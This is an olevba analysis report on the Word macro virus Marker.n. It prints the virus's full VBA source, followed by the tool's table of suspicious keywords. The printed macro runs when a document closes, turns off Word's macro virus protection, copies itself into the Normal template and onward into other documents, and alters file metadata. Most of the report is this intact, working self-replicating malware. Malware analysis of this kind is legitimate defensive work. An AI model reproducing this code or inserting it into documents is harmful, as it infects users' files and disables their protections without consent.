olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.n-30ad7f72406a53966a21a28e6b2b5e9b5a8063cb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.n-30ad7f72406a53966a21a28e6b2b5e9b5a8063cb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





































Private Sub Document_Close()
On Error Resume Next
Const ID = "xyzzy"
Dim hdlskk As Boolean
Dim ijnff, iitgh As Object
Dim zmbbcxx As String
Set ijnff = ActiveDocument.VBProject.VBComponents.Item(1)
Set iitgh = NormalTemplate.VBProject.VBComponents.Item(1)
Options.VirusProtection = False
If (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
If ijnff.codemodule.Find(ID, 1, 1, 10000, 10000) = True Then
hdlskk = NormalTemplate.Saved
zmbbcxx = ijnff.codemodule.Lines(1, ijnff.codemodule.CountOfLines)
iitgh.codemodule.deletelines 1, iitgh.codemodule.CountOfLines
iitgh.codemodule.AddFromString zmbbcxx
If hdlskk = True Then NormalTemplate.Save
End If
If iitgh.codemodule.Find(ID, 1, 1, 10000, 10000) = True And (Mid(ActiveDocument.FullName, 2, 1) = ":" Or ActiveDocument.Saved = False) Then
zmbbcxx = iitgh.codemodule.Lines(1, iitgh.codemodule.CountOfLines)
ijnff.codemodule.deletelines 1, ijnff.codemodule.CountOfLines
ijnff.codemodule.AddFromString zmbbcxx
End If
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

